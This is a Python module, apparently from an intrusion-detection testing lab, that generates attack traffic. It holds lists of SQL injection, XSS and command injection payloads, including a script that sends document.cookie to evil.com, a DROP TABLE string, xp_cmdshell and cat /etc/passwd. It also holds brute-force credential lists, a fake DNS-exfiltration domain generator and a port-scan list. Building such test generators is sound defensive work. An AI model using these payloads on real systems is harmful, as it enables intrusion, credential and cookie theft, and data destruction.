"""
attack_lab/utils/payload_generator.py
========================================
Professional Payload Generator

Generates realistic attack payloads for each attack type.
All payloads are designed for IDS testing ONLY on localhost.
"""

import random
import string
import base64
import time


class PayloadGenerator:
    """Generates realistic attack payloads for IDS simulation."""

    # ============================================================
    # SQL Injection Payloads (realistic but harmless for lab)
    # ============================================================
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "') OR ('1'='1",
        "1' UNION SELECT null,null,null--",
        "1' UNION SELECT username,password,null FROM users--",
        "' OR 1=1--",
        "' AND SLEEP(1)--",
        "'; DROP TABLE users;--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
        "1 UNION SELECT 1,2,3--",
        "' OR 'x'='x",
        "1; EXEC xp_cmdshell('dir')--",
        "1' ORDER BY 3--",
    ]

    # ============================================================
    # XSS Payloads
    # ============================================================
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg/onload=alert('xss')>",
        "javascript:alert('xss')",
        "<body onload=alert('xss')>",
        '"><script>alert(document.cookie)</script>',
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "';alert('xss')//",
        "<ScRiPt>alert('xss')</ScRiPt>",
    ]

    # ============================================================
    # Command Injection Payloads
    # ============================================================
    CMD_PAYLOADS = [
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; id; uname -a",
        "$(whoami)",
        "`id`",
        "; ping -c 3 127.0.0.1",
        "| dir",
        "&& ipconfig /all",
        "; net user",
    ]

    # ============================================================
    # Common Brute Force Passwords
    # ============================================================
    WEAK_PASSWORDS = [
        "password", "123456", "admin", "admin123", "qwerty",
        "letmein", "welcome", "monkey", "dragon", "master",
        "shadow", "michael", "sunshine", "princess", "iloveyou",
        "batman", "football", "baseball", "superman", "trustno1",
        "pass", "test", "guest", "root", "user", "login",
        "changeme", "default", "12345678", "password1",
    ]

    USERNAMES = [
        "admin", "root", "administrator", "user", "guest",
        "test", "operator", "sysadmin", "manager", "superuser",
        "service", "web", "api", "deploy",
    ]

    # ============================================================
    # DNS Tunnel Query Generator
    # ============================================================
    @staticmethod
    def generate_dns_tunnel_query() -> str:
        """Generate a suspiciously long DNS query mimicking exfil."""
        # Encode fake data as base32-like subdomain
        fake_data = ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))
        parts = [fake_data[i:i+10] for i in range(0, len(fake_data), 10)]
        domain = ".".join(parts) + ".exfil.attacker.lab"
        return domain

    @staticmethod
    def get_sql_payload() -> str:
        return random.choice(PayloadGenerator.SQL_PAYLOADS)

    @staticmethod
    def get_xss_payload() -> str:
        return random.choice(PayloadGenerator.XSS_PAYLOADS)

    @staticmethod
    def get_cmd_payload() -> str:
        return random.choice(PayloadGenerator.CMD_PAYLOADS)

    @staticmethod
    def get_credentials() -> tuple:
        return (
            random.choice(PayloadGenerator.USERNAMES),
            random.choice(PayloadGenerator.WEAK_PASSWORDS)
        )

    @staticmethod
    def generate_random_port_list(count: int = 100) -> list:
        """Generate random port list for port scan simulation."""
        common = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                  3306, 3389, 5432, 6379, 8080, 8443, 8888, 9090, 27017]
        random_ports = random.sample(range(1024, 65535), max(0, count - len(common)))
        all_ports = list(set(common + random_ports))
        random.shuffle(all_ports)
        return all_ports[:count]
